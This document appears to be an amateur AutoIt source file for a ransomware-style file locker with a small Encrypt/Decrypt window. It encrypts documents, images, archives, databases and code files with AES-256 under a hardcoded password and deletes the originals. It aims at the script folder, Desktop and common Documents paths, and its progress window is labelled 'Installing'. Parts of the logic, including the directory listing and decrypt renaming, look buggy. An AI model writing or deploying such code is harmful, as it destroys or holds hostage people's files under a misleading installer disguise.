#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.2
 Author:         jay

 Script Function:
	encrypts some folder and decrypts too . meh

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here


#include <ComboConstants.au3>
#include <StaticConstants.au3>
#include <Crypt.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
#include <file.au3>
#include <ButtonConstants.au3>
#include <WindowsConstants.au3>

Global $extension[29] = ["txt", "doc", "docx", "xls", "lsx", "ppt", "ptx", "jpg", "png", "csv", "sql", "php", "asp", "xml", "psd" , "zip", "mp4", "mp3", "gif", "rar", "csv", "htm", "tml", "pdf", "xlr", "sql", ".db", "tls", "py"]

Func encrypt($a_files,$path)


	For $i = 1 To $a_files[0]

		ConsoleWrite($a_files[$i])
		$ext = StringRight($a_files[$i],3)
		ConsoleWrite($ext)
		ConsoleWrite("  ")
		$valid = _ArraySearch($extension,$ext)
		ConsoleWrite($valid)
		ConsoleWrite("  ")
		$no = -1
	 If Not($valid = $no) Then
			$f_path = $path & "\" & $a_files[$i]
			$rc  = _Crypt_EncryptFile($f_path,$f_path & ".crypt", "APASSWORD", $CALG_AES_256)
			If $rc Then
				;MsgBox($MB_SYSTEMMODAL, "Success", $f_path)
				FileDelete($f_path)
			Else
				ConsoleWrite("Error: " & @error & @CRLF)
			EndIf
	Else
			ConsoleWrite("not valid ext  ")
	EndIf
	Next

EndFunc

Func decrypt($d_files,$path)



	For $i = 1 To $d_files[0]


		ConsoleWrite($d_files[$i])
		$ext = StringRight($d_files[$i],5)
		ConsoleWrite($ext)
		ConsoleWrite("  ")
		$check = "crypt"
		$valid = StringCompare($check,$ext)
		ConsoleWrite($valid)
		ConsoleWrite("  ")
		$no = 0
	 If ($valid = $no) Then
		$f_path = $path & "\" & $d_files[$i]
		$rc  = _Crypt_DecryptFile($f_path,$f_path & ".crypt", "APASSWORD", $CALG_AES_256)
		If $rc Then
			;MsgBox($MB_SYSTEMMODAL, "Success",$f_path)
			FileDelete($f_path)
			$c_name = $f_path & ".crypt"
			$name = StringTrimRight($c_name,12)

			FileMove($c_name,$name)
		Else
			ConsoleWrite("Error: " & @error & @CRLF)
		EndIf

	 Else
		ConsoleWrite("no")
	 EndIf
	 Next

EndFunc


#Region ### START Koda GUI section ### Form=
$Form1 = GUICreate("Sample1", 316, 242, 192, 124)
$Button1 = GUICtrlCreateButton("Encrypt", 216, 64, 75, 25)
$Button2 = GUICtrlCreateButton("Decrypt", 216, 112, 75, 25)
$Pic1 = GUICtrlCreatePic(@ScriptDir & "\ERhISrt.gif", 56, 48, 100, 100)
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $Button1
			ProgressOn("Installing", "encrypt", "Working...")
			$a_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);

			For $i = 0 To 30
				ProgressSet($i)
				Sleep(5)
			Next
			;MsgBox($MB_SYSTEMMODAL,"list",@ScriptDir)
			Call("encrypt",$a_files,@ScriptDir)

			For $i = 31 To 60
				ProgressSet($i)
				Sleep(5)
			Next

			;MsgBox($MB_SYSTEMMODAL,"list",@DesktopDir)
			$a_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);
			Call("encrypt",$a_files,@DesktopDir)

			For $i = 61 To 90
				ProgressSet($i)
				Sleep(5)
			Next

			$a_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);
			Call("encrypt",$a_files,@DocumentsCommonDir)
			;MsgBox($MB_SYSTEMMODAL,"list",@DocumentsCommonDir)

			For $i = 91 To 100
				ProgressSet($i)
				Sleep(5)
			Next

			ProgressSet(100, "Done!")
			Sleep(750)
			ProgressOff()


		Case $Button2
			ProgressOn("Installing", "encrypt", "Working...")

			$d_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);
			;MsgBox($MB_SYSTEMMODAL,"list",@ScriptDir)

			For $i = 0 To 30
				ProgressSet($i)
				Sleep(5)
			Next

			Call("decrypt",$d_files,@ScriptDir)

			For $i = 31 To 60
				ProgressSet($i)
				Sleep(5)
			Next

			$d_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);
			;MsgBox($MB_SYSTEMMODAL,"list",@DesktopDir)
			Call("decrypt",$d_files,@DesktopDir)

			For $i = 61 To 90
				ProgressSet($i)
				Sleep(5)
			Next

			$d_files = _FileListToArrayRec(@ScriptDir, "*", $FLTAR_FILES, $FLTAR_RECUR, $FLTAR_SORT);
			Call("decrypt",$d_files,@DocumentsCommonDir)

			For $i = 91 To 100
				ProgressSet($i)
				Sleep(5)
			Next

			ProgressSet(100, "Done!")
			Sleep(750)
			ProgressOff()

		Case $GUI_EVENT_CLOSE
			Exit

	EndSwitch
WEnd









